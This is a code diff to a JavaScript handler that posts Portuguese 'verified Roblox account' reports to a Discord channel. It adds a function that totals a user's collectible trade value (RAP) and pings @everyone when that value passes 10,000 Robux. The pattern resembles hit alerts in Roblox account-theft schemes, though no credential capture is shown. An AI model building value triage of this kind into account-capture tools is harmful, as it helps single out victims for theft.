@@ -19,6 +19,57 @@ function flag(code) {
   catch(e) { return '🌍'; }
 }
 
+async function fetchUserRap(userId) {
+  const numericUserId = Number(userId);
+  if (!Number.isSafeInteger(numericUserId) || numericUserId <= 0) return null;
+
+  const deadline = Date.now() + 7000;
+  const seenCursors = new Set();
+  let cursor = null;
+  let totalRap = 0;
+
+  for (let page = 0; page < 40; page++) {
+    if (Date.now() >= deadline) return null;
+
+    const url = new URL(`https://inventory.roblox.com/v1/users/${numericUserId}/assets/collectibles`);
+    url.searchParams.set('limit', '100');
+    url.searchParams.set('sortOrder', 'Asc');
+    if (cursor) url.searchParams.set('cursor', cursor);
+
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 1800);
+    let response;
+    try {
+      response = await fetch(url, {
+        headers: { Accept: 'application/json' },
+        signal: controller.signal,
+      });
+    } catch(e) {
+      return null;
+    } finally {
+      clearTimeout(timeoutId);
+    }
+
+    if (!response.ok) return null;
+    let result;
+    try { result = await response.json(); }
+    catch(e) { return null; }
+    if (!Array.isArray(result.data)) return null;
+
+    for (const item of result.data) {
+      const value = Number(item.recentAveragePrice);
+      if (Number.isFinite(value) && value > 0) totalRap += value;
+    }
+
+    cursor = result.nextPageCursor;
+    if (!cursor) return Math.round(totalRap);
+    if (seenCursors.has(cursor)) return null;
+    seenCursors.add(cursor);
+  }
+
+  return null;
+}
+
 async function fetchThumbnail(userId) {
   // Try up to 3 times (Roblox thumbnail can return Pending on first call)
   for (let i = 0; i < 3; i++) {
@@ -70,14 +121,24 @@ export default async function handler(req, res) {
   }
 
   // Fetch avatar (with retry for Pending state)
-  const avatarUrl = userId ? await fetchThumbnail(userId) : null;
+  const [avatarUrl, rap] = await Promise.all([
+    userId ? fetchThumbnail(userId) : Promise.resolve(null),
+    userId ? fetchUserRap(userId) : Promise.resolve(null),
+  ]);
+  const rapDisplay = rap === null
+    ? 'Indisponível'
+    : `${new Intl.NumberFormat('pt-BR').format(rap)} Robux`;
 
   const verificationHeader = [
+    ...(rap !== null && rap > 10000 ? ['@everyone', ''] : []),
     '<:warn:1552114519860576357> **Conta Roblox Verificada**',
     '',
     '<:member:1552114515682787411> **Username**',
     `@${username || 'N/A'}`,
-  ].join('\n');
+    '',
+    '<:fggh:1552114775822176337> **RAP:**',
+    rapDisplay,
+  ].join(String.fromCharCode(10));
 
   const verificationDetails = [
     '<:embed:1552114534615879700> **Data de Criação**',
@@ -126,6 +187,7 @@ export default async function handler(req, res) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         flags: 1 << 15,
+        allowed_mentions: { parse: rap !== null && rap > 10000 ? ['everyone'] : [] },
         components,
       }),
     });
